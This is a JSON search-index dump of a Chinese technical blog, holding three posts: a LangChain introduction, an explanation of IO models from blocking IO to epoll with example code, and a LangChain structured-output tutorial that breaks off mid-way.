[{"content":"最近一阶段，在做知识库相关的应用开发，想着整理下 langchain 与 llamaindex\nlangchain docs官网: https://python.langchain.com/docs/introduction/\nlangchain是什么？ langchain是一个由大模型驱动的应用程序开发框架。 简化了LLM应用程序生命周期的每一个阶段 langchain: LLM应用框架 langsmith: 调试、监控与评估 langgraph: 构建复杂流程图，即有状态的agent工作流 怎么用？ # 创建基础环境，这里使用 miniconda https://www.anaconda.com/docs/getting-started/miniconda/install conda create -n \u0026#34;langchain\u0026#34; python=3.12 # 激活环境 conda activate langchain # 下载依赖 pip install -qU \u0026#34;langchain[openai]\u0026#34; -i https://pypi.tuna.tsinghua.edu.cn/simple import getpass import os os.environ[\u0026#34;OPENAI_API_KEY\u0026#34;] = \u0026#34;yourkey\u0026#34; os.environ[\u0026#34;OPENAI_API_BASE\u0026#34;] = \u0026#34;http://127.0.0.1:8080/v1\u0026#34; from langchain.chat_models import init_chat_model model = init_chat_model(\u0026#34;gpt-4o-mini\u0026#34;, model_provider=\u0026#34;openai\u0026#34;) model.invoke(\u0026#34;Hello, world!\u0026#34;) # 调用 架构 package 系统关系 架构拆分 langchain-core 包含了其他包使用的基类以及抽象，所以都不需要显示指定安装core包 langchain-openai 集成了如 Openai 这种类型的包 langchain-community 未被拆分出来的包，都统一放在这个包里 langchain-experimental 包含研究和实验的包 langgraph 用于构建具有 LLMs 的状态话，多参与者应用的库 langserve 帮助开发者将 LangChain 可运行程序和链作为 REST API 进行部署 LangServe 由 LangChain CLI 自动安装。如果未使用 LangChain CLI，请使用以下方式安装 pip install \u0026quot;langserve[all]\u0026quot; 或者拆分 S-C 架构: pip install \u0026quot;langserve[client]\u0026quot; 与 pip install \u0026quot;langserve[server]\u0026quot; langchain-cli LangChain 命令行工具对于使用 LangChain 模板和其他 LangServe 项目很有用 langsmith 不依赖于 langchain-core, 如果有需要，可以独立安装和使用 https://github.com/langchain-ai/langchain 另外可以源码安装编译 pip install -e . ","permalink":"https://al6nlee.github.io/post/%E5%A4%A7%E6%A8%A1%E5%9E%8B/langchain/01-langchain%E5%85%A5%E9%97%A8.html","summary":"\u003cp\u003e最近一阶段，在做知识库相关的应用开发，想着整理下 langchain 与 llamaindex\u003c/p\u003e","title":"01-langchain入门"},{"content":"探讨了不同IO的演进过程，从传统阻塞IO说起，说到NIO、select、epoll\n传统阻塞IO public Order queryOrder() { // 这里会卡住，直到订单服务返回订单信息，read()方法才会返回 Order order = orderConnection.read(); // 查询订单信息 log.info(\u0026#34;查询订单信息, 收到返回 {}\u0026#34;, order); return order; } 当执行orderConnection.read()时，因为不能确定订单服务多久返回 为了避免干等，浪费资源，操作系统会暂停当前线程，转而去执行其他程序 等到订单服务返回了了，再恢复执行 注意：IO操作和线程是耦合在一起的，如果IO操作被阻塞了，整个线程都会被挂起\n优点 对开发人员友好，非常简单，符合直觉\n缺点 IO操作会阻塞整个线程，每个连接都需要对应一个专门的线程 以Java为例，线程默认的栈大小是1M 要同时处理10万个连接，就需要10万个线程，光是线程的栈内存就要100G\n-\u0026gt; 为了避免创建的线程太多，耗尽内存，阻塞IO通常配合线程池使用\n非阻塞IO 默认情况下，IO操作被阻塞时，操作系统会挂起线程 但也可以在创建连接时，开启O_NONBLOCK选项，让操作系统不挂起线程，而是直接返回\npublic void mainLoop() { Connection conn1 = open(O_NONBLOCK); Connection conn2 = open(O_NONBLOCK); Connection conn3 = open(O_NONBLOCK); List\u0026lt;Connection\u0026gt; connections = List.of(conn1, conn2, conn3); while(true) { for(Connection conn : connections) { // 由于设置了O_NONBLOCK选项，这里不会阻塞 Object data = conn.read(); if(data != null) { System.out.println(data); } } } } 优点 解决了IO操作导致整个线程挂起的问题，可以实现一个线程同时处理多个连接\n缺点 不停地轮询会带来很多无效的操作，也会导致CPU使用率飙高\nIO多路复用 因为不知道连接什么时候会收到数据，所以非阻塞IO要不停地重试，导致CPU飙高\n-\u0026gt; 不要自己盲目的去试，而是让连接在收到数据之后，主动通知自己\n也就是，实现了一套wait - notify的事件通知机制\n// 监控指定的连接，并且阻塞调用select()的线程 // 直到有连接就绪或者超过timeout时间，再唤醒select线程并返回 // nfds表示需要检查的文件句柄（连接）的数量 // readfds,writefds,exceptfds表示要监听的文件句柄(连接) // timeout表示超时时间 int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); int main(void) { // 主循环 for(;;) { // 将连接就绪的标志位清零： // select会通过修改入参的方式指明哪些连接就绪了 // 所以每次调用select之前，都要先把连接就绪的标志位清零 FD_SET(0, \u0026amp;rfds); // 探测是否有连接就绪；当前线程会被挂起，直到有连接就绪或者超时 int retval = select(n, \u0026amp;rfds, NULL, NULL, \u0026amp;tv); if (retval == -1) perror(\u0026#34;调用select出错\u0026#34;); else if (retval) printf(\u0026#34;有连接就绪\u0026#34;); for (j = 0; j \u0026lt;= n; j++) { // select会通过修改入参的方式，指明哪些连接就绪了 // 这里遍历所有连接，判断是否就绪 if(FD_ISSET(j, rfds)) { // select只是探测哪些连接就绪了，但不会实际读取数据 // 这里通过revc()方法实际读取数据 recv(rfds[j]) } } else printf(\u0026#34;在超时时间内没有任何连接就绪\u0026#34;); } } select 实现细节 调用select()时，给所有要监控的连接注册回调函数 回调函数是注册在连接的wait_queue里 挂起select线程，等待连接就绪 当连接收到数据时，会触发回调函数，并恢复select线程 当某个连接收到了远程服务的响应，它就会执行自己wait_queue里回调函数，并唤醒select线程 回调函数会设置好哪些连接就绪了，并移除所有连接wait_queue里的回调函数（类似于资源清理） select线程恢复执行后，就可以处理就绪的连接 优点 实现了一套wait-notify机制，相比于不停地轮询，效率更高\n缺点 select()每次都要在全量的连接上，先逐个注册回调函数，再逐个移除回调函数 复杂度是O(n)，其中n是要监控的连接数 select()只是返回哪些连接就绪了，还需要再额外调用recv()实际读取数据 epoll select()每次都要在全量的连接上，先逐个注册回调函数，再逐个移除回调函数\nepoll通过将API细分为3个，将全量操作优化成了增量操作\nepoll_create() 初始化epoll自己要用的内部结构 epoll_ctl() 添加或者删除要监听的连接 epoll_wait() 挂起调用线程，等待连接事件，当有连接就绪时，或者超时返回 优点 分了3个API，epoll_create() / epoll_ctl() / epoll_wait() 实现了增量操作 结合红黑树，将算法复杂度降低到了O(lgN)\n# define MAX_EVENTS 10 struct epoll_event ev, events[MAX_EVENTS]; int listen_sock, cAonn_sock, nfds, epollfd; /* Code to set up listening socket, \u0026#39;listen_sock\u0026#39;, (socket(), bind(), listen()) omitted */ // 创建epoll内部用到的结构 epollfd = epoll_create1(0); if (epollfd == -1) { perror(\u0026#34;epoll_create1\u0026#34;); exit(EXIT_FAILURE); } // 将listen socket作为一个事件源添加到epoll的监听队列中 ev.events = EPOLLIN; ev.data.fd = listen_sock; if (epoll_ctl(epollfd, EPOLL_CTL_ADD, listen_sock, \u0026amp;ev) == -1) { perror(\u0026#34;epoll_ctl: listen_sock\u0026#34;); exit(EXIT_FAILURE); } // 主循环 for (;;) { // 探测是否有就绪的连接 nfds = epoll_wait(epollfd, events, MAX_EVENTS, -1); if (nfds == -1) { perror(\u0026#34;epoll_wait\u0026#34;); exit(EXIT_FAILURE); } // 对所有就绪的连接，逐个处理连接上的事件 for (n = 0; n \u0026lt; nfds; ++n) { if (events[n].data.fd == listen_sock) { // 如果是新建连接事件，完成连接建立 conn_sock = accept(listen_sock, (struct sockaddr *) \u0026amp;addr, \u0026amp;addrlen); if (conn_sock == -1) { perror(\u0026#34;accept\u0026#34;); exit(EXIT_FAILURE); } setnonblocking(conn_sock); ev.events = EPOLLIN | EPOLLET; ev.data.fd = conn_sock; // 将新建立的连接作为事件源，添加到epoll的监听队列 if (epoll_ctl(epollfd, EPOLL_CTL_ADD, conn_sock, \u0026amp;ev) == -1) { perror(\u0026#34;epoll_ctl: conn_sock\u0026#34;); exit(EXIT_FAILURE); } } else { // 对于读写事件，根据业务需求做相应的处理 // 同样的，到这一步只是知道哪个连接就绪了，还没有实际读取数据 // 一些对性能要求特别高的场景，会选择用专门的IO线程来读取数据 // 比如redis 6.0以后，就加入了专门的IO线程 do_use_fd(events[n].data.fd); } } } 总结 处理IO的方式 优点 缺点 传统阻塞IO 对开发人员友好，写代码简单 连接和线程耦合在了一起，每个连接都有对应一个线程，限制了一台机器能处理的最大连接数\nPS: 为了避免内存耗尽，阻塞IO通常配合线程池使用 非阻塞IO\nO_NONBLOCK 通过设置O_NONBLOCK标志位，让操作系统不挂起当前线程，可以实现一个线程同时处理多个连接 不停地轮询效率低，浪费CPU资源 IO多路复用select() 实现了wait-notify机制，比轮询效率高 每次调用select()都需要准备相关参数，修改所有连接句柄的wait_queue，算法复杂度较高 \u0026ndash; O(n) epoll 通过epoll_create() / epoll_ctl() / epoll_wait()3个API，在epoll内部管理相关的参数和结构，实现了增量操作，效率更高 \u0026ndash; O(lgN) 单个线程管理连接数过多时，epoll_wait线程本身可能成为瓶颈，可以用多epoll_wait线程 + 多IO线程的策略解决 ","permalink":"https://al6nlee.github.io/post/%E6%95%B0%E6%8D%AE%E5%BA%93/redis/01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3nio.html","summary":"\u003cp\u003e探讨了不同IO的演进过程，从传统阻塞IO说起，说到NIO、select、epoll\u003c/p\u003e","title":"01-深入了解NIO"},{"content":"本章节主要讲述langchain的一些核心功: ①: 模型返回结构化数据；②: 调用工具；③: 流式运行；④ 调试LLM应用\n从模型返回结构化数据 with_structured_output基础应用 选择模型，大前提已经安装好了 pip install -qU \u0026quot;langchain[openai]\u0026quot;\nimport getpass import os if not os.environ.get(\u0026#34;OPENAI_API_KEY\u0026#34;): os.environ[\u0026#34;OPENAI_API_KEY\u0026#34;] = getpass.getpass(\u0026#34;Enter API key for OpenAI: \u0026#34;) from langchain.chat_models import init_chat_model llm = init_chat_model(\u0026#34;gpt-4o-mini\u0026#34;, model_provider=\u0026#34;openai\u0026#34;) 希望返回一个 Pydantic 对象\n使用 Pydantic 的主要优势是模型生成的输出将被验证。如果任何必需字段缺失或字段类型错误，Pydantic 会抛出错误。 注意: 除了 Pydantic 类的结构之外，Pydantic 类的名称、文档字符串以及参数的名称和提供的描述都非常重要。 from typing import Optional from pydantic import BaseModel, Field class Joke(BaseModel): \u0026#34;\u0026#34;\u0026#34;Joke to tell user.\u0026#34;\u0026#34;\u0026#34; setup: str = Field(description=\u0026#34;The setup of the joke\u0026#34;) punchline: str = Field(description=\u0026#34;The punchline to the joke\u0026#34;) rating: Optional[int] = Field( default=None, description=\u0026#34;How funny the joke is, from 1 to 10\u0026#34; ) structured_llm = llm.with_structured_output(Joke) structured_llm.invoke(\u0026#34;Tell me a joke about cats\u0026#34;) \u0026#34;\u0026#34;\u0026#34; Joke(setup=\u0026#39;Why was the cat sitting on the computer?\u0026#39;, punchline=\u0026#39;Because it wanted to keep an eye on the mouse!\u0026#39;, rating=7) \u0026#34;\u0026#34;\u0026#34; 希望返回的是一个 TypedDict 或 JSON Schema，选择使用 LangChain 支持的一种特殊 Annotated 语法，该语法允许您指定字段的默认值和描述。请注意，如果模型未生成默认值，则不会自动填充默认值，它仅用于定义传递给模型的架构。\nfrom typing import Optional from typing_extensions import Annotated, TypedDict # TypedDict class Joke(TypedDict): \u0026#34;\u0026#34;\u0026#34;Joke to tell user.\u0026#34;\u0026#34;\u0026#34; setup: Annotated[str, ..., \u0026#34;The setup of the joke\u0026#34;] # Alternatively, we could have specified setup as: # setup: str # no default, no description # setup: Annotated[str, ...] # no default, no description # setup: Annotated[str, \u0026#34;foo\u0026#34;] # default, no description punchline: Annotated[str, ..., \u0026#34;The punchline of the joke\u0026#34;] rating: Annotated[Optional[int], None, \u0026#34;How funny the joke is, from 1 to 10\u0026#34;] structured_llm = llm.with_structured_output(Joke) structured_llm.invoke(\u0026#34;Tell me a joke about cats\u0026#34;) \u0026#34;\u0026#34;\u0026#34; {\u0026#39;setup\u0026#39;: \u0026#39;Why was the cat sitting on the computer?\u0026#39;, \u0026#39;punchline\u0026#39;: \u0026#39;Because it wanted to keep an eye on the mouse!\u0026#39;, \u0026#39;rating\u0026#39;: 7} \u0026#34;\u0026#34;\u0026#34; json_schema = { \u0026#34;title\u0026#34;: \u0026#34;joke\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Joke to tell user.\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;setup\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The setup of the joke\u0026#34;, }, \u0026#34;punchline\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The punchline to the joke\u0026#34;, }, \u0026#34;rating\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;integer\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;How funny the joke is, from 1 to 10\u0026#34;, \u0026#34;default\u0026#34;: None, }, }, \u0026#34;required\u0026#34;: [\u0026#34;setup\u0026#34;, \u0026#34;punchline\u0026#34;], } structured_llm = llm.with_structured_output(json_schema) structured_llm.invoke(\u0026#34;Tell me a joke about cats\u0026#34;) \u0026#34;\u0026#34;\u0026#34; {\u0026#39;setup\u0026#39;: \u0026#39;Why was the cat sitting on the computer?\u0026#39;, \u0026#39;punchline\u0026#39;: \u0026#39;Because it wanted to keep an eye on the mouse!\u0026#39;, \u0026#39;rating\u0026#39;: 7} \u0026#34;\u0026#34;\u0026#34; 使用 Unio 类型属性，让模型可以从多个Pydantic模型之间进行选择\nfrom typing import Union class Joke(BaseModel): \u0026#34;\u0026#34;\u0026#34;Joke to tell user.\u0026#34;\u0026#34;\u0026#34; setup: str = Field(description=\u0026#34;The setup of the joke\u0026#34;) punchline: str = Field(description=\u0026#34;The punchline to the joke\u0026#34;) rating: Optional[int] = Field( default=None, description=\u0026#34;How funny the joke is, from 1 to 10\u0026#34; ) class ConversationalResponse(BaseModel): \u0026#34;\u0026#34;\u0026#34;Respond in a conversational manner. Be kind and helpful.\u0026#34;\u0026#34;\u0026#34; response: str = Field(description=\u0026#34;A conversational response to the user\u0026#39;s query\u0026#34;) class FinalResponse(BaseModel): final_output: Union[Joke, ConversationalResponse] structured_llm = llm.with_structured_output(FinalResponse) structured_llm.invoke(\u0026#34;Tell me a joke about cats\u0026#34;) \u0026#34;\u0026#34;\u0026#34; FinalResponse(final_output=Joke(setup=\u0026#39;Why was the cat sitting on the computer?\u0026#39;, punchline=\u0026#39;Because it wanted to keep an eye on the mouse!\u0026#39;, rating=7)) \u0026#34;\u0026#34;\u0026#34; structured_llm.invoke(\u0026#34;How are you today?\u0026#34;) \u0026#34;\u0026#34;\u0026#34; FinalResponse(final_output=ConversationalResponse(response=\u0026#34;I\u0026#39;m just a computer program, so I don\u0026#39;t have feelings, but I\u0026#39;m here and ready to help you with whatever you need!\u0026#34;)) \u0026#34;\u0026#34;\u0026#34; 流式输出: 当输出类型是字典时（即，当模式被指定为 TypedDict 类或 JSON Schema 字典时），我们可以从结构化模型中流式输出。\nfrom typing_extensions import Annotated, TypedDict # TypedDict class Joke(TypedDict): \u0026#34;\u0026#34;\u0026#34;Joke to tell user.\u0026#34;\u0026#34;\u0026#34; setup: Annotated[str, ..., \u0026#34;The setup of the joke\u0026#34;] punchline: Annotated[str, ..., \u0026#34;The punchline of the joke\u0026#34;] rating: Annotated[Optional[int], None, \u0026#34;How funny the joke is, from 1 to 10\u0026#34;] structured_llm = llm.with_structured_output(Joke) for chunk in structured_llm.stream(\u0026#34;Tell me a joke about cats\u0026#34;): print(chunk) \u0026#34;\u0026#34;\u0026#34; {} {\u0026#39;setup\u0026#39;: \u0026#39;\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why was\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why was the\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why was the cat\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why was the cat sitting\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why was the cat sitting on\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why was the cat sitting on the\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why was the cat sitting on the computer\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why was the cat sitting on the computer?\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why was the cat sitting on the computer?\u0026#39;, \u0026#39;punchline\u0026#39;: \u0026#39;\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why was the cat sitting on the computer?\u0026#39;, \u0026#39;punchline\u0026#39;: \u0026#39;Because\u0026#39;} {\u0026#39;setup\u0026#39;: \u0026#39;Why was the cat sitting on the computer?\u0026#39;, \u0026#39;punchline\u0026#39;: \u0026#39;Because it\u0026#39;} ... \u0026#34;\u0026#34;\u0026#34; 少样本提示，对于复杂的场景，需要加入少量的示例\n最简单的方式，使用prompt，直接隐式将消息传入了\nfrom langchain_core.prompts import ChatPromptTemplate system = \u0026#34;\u0026#34;\u0026#34;You are a hilarious comedian. Your specialty is knock-knock jokes. \\ Return a joke which has the setup (the response to \u0026#34;Who\u0026#39;s there?\u0026#34;) and the final punchline (the response to \u0026#34;\u0026lt;setup\u0026gt; who?\u0026#34;). Here are some examples of jokes: example_user: Tell me a joke about planes example_assistant: {{\u0026#34;setup\u0026#34;: \u0026#34;Why don\u0026#39;t planes ever get tired?\u0026#34;, \u0026#34;punchline\u0026#34;: \u0026#34;Because they have rest wings!\u0026#34;, \u0026#34;rating\u0026#34;: 2}} example_user: Tell me another joke about planes example_assistant: {{\u0026#34;setup\u0026#34;: \u0026#34;Cargo\u0026#34;, \u0026#34;punchline\u0026#34;: \u0026#34;Cargo \u0026#39;vroom vroom\u0026#39;, but planes go \u0026#39;zoom zoom\u0026#39;!\u0026#34;, \u0026#34;rating\u0026#34;: 10}} example_user: Now about caterpillars example_assistant: {{\u0026#34;setup\u0026#34;: \u0026#34;Caterpillar\u0026#34;, \u0026#34;punchline\u0026#34;: \u0026#34;Caterpillar really slow, but watch me turn into a butterfly and steal the show!\u0026#34;, \u0026#34;rating\u0026#34;: 5}}\u0026#34;\u0026#34;\u0026#34; prompt = ChatPromptTemplate.from_messages([(\u0026#34;system\u0026#34;, system), (\u0026#34;human\u0026#34;, \u0026#34;{input}\u0026#34;)]) few_shot_structured_llm = prompt | structured_llm few_shot_structured_llm.invoke(\u0026#34;what\u0026#39;s something funny about woodpeckers\u0026#34;) \u0026#34;\u0026#34;\u0026#34; {\u0026#39;setup\u0026#39;: \u0026#39;Woodpecker\u0026#39;, \u0026#39;punchline\u0026#39;: \u0026#34;Woodpecker you a joke, but I\u0026#39;m afraid it might be too \u0026#39;hole-some\u0026#39;!\u0026#34;, \u0026#39;rating\u0026#39;: 7} \u0026#34;\u0026#34;\u0026#34; 显示工具调用传入的方式进行\nfrom langchain_core.messages import AIMessage, HumanMessage, ToolMessage examples = [ HumanMessage(\u0026#34;Tell me a joke about planes\u0026#34;, name=\u0026#34;example_user\u0026#34;), AIMessage( \u0026#34;\u0026#34;, name=\u0026#34;example_assistant\u0026#34;, tool_calls=[ { \u0026#34;name\u0026#34;: \u0026#34;joke\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;setup\u0026#34;: \u0026#34;Why don\u0026#39;t planes ever get tired?\u0026#34;, \u0026#34;punchline\u0026#34;: \u0026#34;Because they have rest wings!\u0026#34;, \u0026#34;rating\u0026#34;: 2, }, \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, } ], ), # Most tool-calling models expect a ToolMessage(s) to follow an AIMessage with tool calls. ToolMessage(\u0026#34;\u0026#34;, tool_call_id=\u0026#34;1\u0026#34;), # Some models also expect an AIMessage to follow any ToolMessages, # so you may need to add an AIMessage here. HumanMessage(\u0026#34;Tell me another joke about planes\u0026#34;, name=\u0026#34;example_user\u0026#34;), AIMessage( \u0026#34;\u0026#34;, name=\u0026#34;example_assistant\u0026#34;, tool_calls=[ { \u0026#34;name\u0026#34;: \u0026#34;joke\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;setup\u0026#34;: \u0026#34;Cargo\u0026#34;, \u0026#34;punchline\u0026#34;: \u0026#34;Cargo \u0026#39;vroom vroom\u0026#39;, but planes go \u0026#39;zoom zoom\u0026#39;!\u0026#34;, \u0026#34;rating\u0026#34;: 10, }, \u0026#34;id\u0026#34;: \u0026#34;2\u0026#34;, } ], ), ToolMessage(\u0026#34;\u0026#34;, tool_call_id=\u0026#34;2\u0026#34;), HumanMessage(\u0026#34;Now about caterpillars\u0026#34;, name=\u0026#34;example_user\u0026#34;), AIMessage( \u0026#34;\u0026#34;, tool_calls=[ { \u0026#34;name\u0026#34;: \u0026#34;joke\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;setup\u0026#34;: \u0026#34;Caterpillar\u0026#34;, \u0026#34;punchline\u0026#34;: \u0026#34;Caterpillar really slow, but watch me turn into a butterfly and steal the show!\u0026#34;, \u0026#34;rating\u0026#34;: 5, }, \u0026#34;id\u0026#34;: \u0026#34;3\u0026#34;, } ], ), ToolMessage(\u0026#34;\u0026#34;, tool_call_id=\u0026#34;3\u0026#34;), ] system = \u0026#34;\u0026#34;\u0026#34;You are a hilarious comedian. Your specialty is knock-knock jokes. \\ Return a joke which has the setup (the response to \u0026#34;Who\u0026#39;s there?\u0026#34;) \\ and the final punchline (the response to \u0026#34;\u0026lt;setup\u0026gt; who?\u0026#34;).\u0026#34;\u0026#34;\u0026#34; prompt = ChatPromptTemplate.from_messages( [(\u0026#34;system\u0026#34;, system), (\u0026#34;placeholder\u0026#34;, \u0026#34;{examples}\u0026#34;), (\u0026#34;human\u0026#34;, \u0026#34;{input}\u0026#34;)] ) few_shot_structured_llm = prompt | structured_llm few_shot_structured_llm.invoke({\u0026#34;input\u0026#34;: \u0026#34;crocodiles\u0026#34;, \u0026#34;examples\u0026#34;: examples}) \u0026#34;\u0026#34;\u0026#34; {\u0026#39;setup\u0026#39;: \u0026#39;Crocodile\u0026#39;, \u0026#39;punchline\u0026#39;: \u0026#39;Crocodile be seeing you later, alligator!\u0026#39;, \u0026#39;rating\u0026#39;: 6} \u0026#34;\u0026#34;\u0026#34; with_structured_output高阶用法 structured_llm = llm.with_structured_output(Joke, include_raw=True) structured_llm.invoke(\u0026#34;Tell me a joke about cats\u0026#34;) include_raw=True 这会将输出格式更改为包含原始消息输出、 parsed 值（如果成功）以及任何产生的错误\nPydanticOutputParser 并非所有模型都支持 .with_structured_output() ，因为并非所有模型都支持工具调用或 JSON 模式。 -\u0026gt; 直接安排解析器\n注意将 format_instructions 添加到提示词中 from typing import List from langchain_core.output_parsers import PydanticOutputParser from langchain_core.prompts import ChatPromptTemplate from pydantic import BaseModel, Field class Person(BaseModel): \u0026#34;\u0026#34;\u0026#34;Information about a person.\u0026#34;\u0026#34;\u0026#34; name: str = Field(..., description=\u0026#34;The name of the person\u0026#34;) height_in_meters: float = Field( ..., description=\u0026#34;The height of the person expressed in meters.\u0026#34; ) class People(BaseModel): \u0026#34;\u0026#34;\u0026#34;Identifying information about all people in a text.\u0026#34;\u0026#34;\u0026#34; people: List[Person] # Set up a parser parser = PydanticOutputParser(pydantic_object=People) # Prompt prompt = ChatPromptTemplate.from_messages( [ ( \u0026#34;system\u0026#34;, \u0026#34;Answer the user query. Wrap the output in `json` tags\\n{format_instructions}\u0026#34;, ), (\u0026#34;human\u0026#34;, \u0026#34;{query}\u0026#34;), ] ).partial(format_instructions=parser.get_format_instructions()) 如果不加解析器 query = \u0026#34;Anna is 23 years old and she is 6 feet tall\u0026#34; print(prompt.invoke({\u0026#34;query\u0026#34;: query}).to_string()) \u0026#34;\u0026#34;\u0026#34; System: Answer the user query. Wrap the output in `json` tags The output should be formatted as a JSON instance that conforms to the JSON schema below. As an example, for the schema {\u0026#34;properties\u0026#34;: {\u0026#34;foo\u0026#34;: {\u0026#34;title\u0026#34;: \u0026#34;Foo\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;a list of strings\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;array\u0026#34;, \u0026#34;items\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}}}, \u0026#34;required\u0026#34;: [\u0026#34;foo\u0026#34;]} the object {\u0026#34;foo\u0026#34;: [\u0026#34;bar\u0026#34;, \u0026#34;baz\u0026#34;]} is a well-formatted instance of the schema. The object {\u0026#34;properties\u0026#34;: {\u0026#34;foo\u0026#34;: [\u0026#34;bar\u0026#34;, \u0026#34;baz\u0026#34;]}} is not well-formatted. Here is the output schema: \\`\\`\\` {\u0026#34;description\u0026#34;: \u0026#34;Identifying information about all people in a text.\u0026#34;, \u0026#34;properties\u0026#34;: {\u0026#34;people\u0026#34;: {\u0026#34;title\u0026#34;: \u0026#34;People\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;array\u0026#34;, \u0026#34;items\u0026#34;: {\u0026#34;$ref\u0026#34;: \u0026#34;#/definitions/Person\u0026#34;}}}, \u0026#34;required\u0026#34;: [\u0026#34;people\u0026#34;], \u0026#34;definitions\u0026#34;: {\u0026#34;Person\u0026#34;: {\u0026#34;title\u0026#34;: \u0026#34;Person\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Information about a person.\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: {\u0026#34;name\u0026#34;: {\u0026#34;title\u0026#34;: \u0026#34;Name\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The name of the person\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}, \u0026#34;height_in_meters\u0026#34;: {\u0026#34;title\u0026#34;: \u0026#34;Height In Meters\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The height of the person expressed in meters.\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;number\u0026#34;}}, \u0026#34;required\u0026#34;: [\u0026#34;name\u0026#34;, \u0026#34;height_in_meters\u0026#34;]}}} \\`\\`\\` Human: Anna is 23 years old and she is 6 feet tall \u0026#34;\u0026#34;\u0026#34; 加上解析器后 chain = prompt | llm | parser chain.invoke({\u0026#34;query\u0026#34;: query}) \u0026#34;\u0026#34;\u0026#34; People(people=[Person(name=\u0026#39;Anna\u0026#39;, height_in_meters=1.8288)]) \u0026#34;\u0026#34;\u0026#34; 自定义一个解析器 使用 LangChain 表达式语言 (LCEL) 创建自定义提示和解析器，使用普通函数解析模型的输出\nimport json import re from typing import List from langchain_core.messages import AIMessage from langchain_core.prompts import ChatPromptTemplate from pydantic import BaseModel, Field class Person(BaseModel): \u0026#34;\u0026#34;\u0026#34;Information about a person.\u0026#34;\u0026#34;\u0026#34; name: str = Field(..., description=\u0026#34;The name of the person\u0026#34;) height_in_meters: float = Field( ..., description=\u0026#34;The height of the person expressed in meters.\u0026#34; ) class People(BaseModel): \u0026#34;\u0026#34;\u0026#34;Identifying information about all people in a text.\u0026#34;\u0026#34;\u0026#34; people: List[Person] # Prompt prompt = ChatPromptTemplate.from_messages( [ ( \u0026#34;system\u0026#34;, \u0026#34;Answer the user query. Output your answer as JSON that \u0026#34; \u0026#34;matches the given schema: \\`\\`\\`json\\n{schema}\\n\\`\\`\\`. \u0026#34; \u0026#34;Make sure to wrap the answer in \\`\\`\\`json and \\`\\`\\` tags\u0026#34;, ), (\u0026#34;human\u0026#34;, \u0026#34;{query}\u0026#34;), ] ).partial(schema=People.schema()) # Custom parser def extract_json(message: AIMessage) -\u0026gt; List[dict]: \u0026#34;\u0026#34;\u0026#34;Extracts JSON content from a string where JSON is embedded between \\`\\`\\`json and \\`\\`\\` tags. Parameters: text (str): The text containing the JSON content. Returns: list: A list of extracted JSON strings. \u0026#34;\u0026#34;\u0026#34; text = message.content # Define the regular expression pattern to match JSON blocks pattern = r\u0026#34;\\`\\`\\`json(.*?)\\`\\`\\`\u0026#34; # Find all non-overlapping matches of the pattern in the string matches = re.findall(pattern, text, re.DOTALL) # Return the list of matched JSON strings, stripping any leading or trailing whitespace try: return [json.loads(match.strip()) for match in matches] except Exception: raise ValueError(f\u0026#34;Failed to parse: {message}\u0026#34;) 没使用解析器前\nquery = \u0026#34;Anna is 23 years old and she is 6 feet tall\u0026#34; print(prompt.format_prompt(query=query).to_string()) \u0026#34;\u0026#34;\u0026#34; System: Answer the user query. Output your answer as JSON that matches the given schema: \\`\\`\\`json {\u0026#39;title\u0026#39;: \u0026#39;People\u0026#39;, \u0026#39;description\u0026#39;: \u0026#39;Identifying information about all people in a text.\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;object\u0026#39;, \u0026#39;properties\u0026#39;: {\u0026#39;people\u0026#39;: {\u0026#39;title\u0026#39;: \u0026#39;People\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;array\u0026#39;, \u0026#39;items\u0026#39;: {\u0026#39;$ref\u0026#39;: \u0026#39;#/definitions/Person\u0026#39;}}}, \u0026#39;required\u0026#39;: [\u0026#39;people\u0026#39;], \u0026#39;definitions\u0026#39;: {\u0026#39;Person\u0026#39;: {\u0026#39;title\u0026#39;: \u0026#39;Person\u0026#39;, \u0026#39;description\u0026#39;: \u0026#39;Information about a person.\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;object\u0026#39;, \u0026#39;properties\u0026#39;: {\u0026#39;name\u0026#39;: {\u0026#39;title\u0026#39;: \u0026#39;Name\u0026#39;, \u0026#39;description\u0026#39;: \u0026#39;The name of the person\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;string\u0026#39;}, 